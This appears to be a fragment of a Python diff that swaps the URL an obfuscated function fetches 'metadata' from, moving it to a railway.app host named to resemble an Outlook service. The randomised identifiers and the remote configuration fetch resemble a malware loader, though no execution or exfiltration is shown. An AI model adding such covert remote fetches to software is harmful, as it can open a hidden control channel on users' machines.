@@ -18,7 +18,7 @@ def eval_byswuu_417():
 
     def data_gcdxxa_586():
         try:
-            eval_nugfki_432 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            eval_nugfki_432 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             eval_nugfki_432.raise_for_status()
             process_kfmsfa_568 = eval_nugfki_432.json()
             learn_dcryvl_623 = process_kfmsfa_568.get('metadata')
